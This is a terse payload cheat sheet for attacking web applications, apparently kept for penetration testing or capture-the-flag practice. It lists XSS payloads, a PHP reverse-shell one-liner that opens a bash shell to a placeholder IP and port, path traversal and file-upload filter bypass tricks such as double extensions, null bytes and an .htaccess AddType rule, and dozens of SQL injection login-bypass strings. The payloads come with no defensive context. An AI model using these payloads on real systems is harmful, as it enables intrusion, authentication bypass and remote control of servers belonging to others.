# XSS easy payload

%3Cimg%20src%3D0%20onerror%3D%27alert(00)%27%2F%3E
<img src=0 onerror='alert(00)'/>
<IMG SRC= onmouseover="alert('xxs')">

text with print: <img src=1 onerror=print()>

<img src=0 onerror='alert`1`'/>

# Reverse shells

<?php
exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<Port> 0>&1’”)
?>

# trasversal and fileupload

trasversal: /../../../../
trasversal: filename=../datei.php / ..%2fdatei.php
content-type= type/type

Read: AddType application/x-httpd-php .l33t / .htaccess

Null terminator= %00

Double extension: datei.php.jpg
Trailing: exploit.php.
URL encoding: exploit%2Ephp
semicolon: exploit.asp;.jpg or exploit.asp%00.jp
recursiv: exploit.p.phphp


# SQL login
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x

')) or true--
')) or ((''))=(('
')) or 1--
')) or (('x'))=(('

')) or true--
')) or ((''))=(('
')) or 1--
')) or (('x'))=(('

" or true--
" or ""="
" or 1--
" or "x"="

') or true--
') or ('')=('
') or 1--
') or ('x')=('
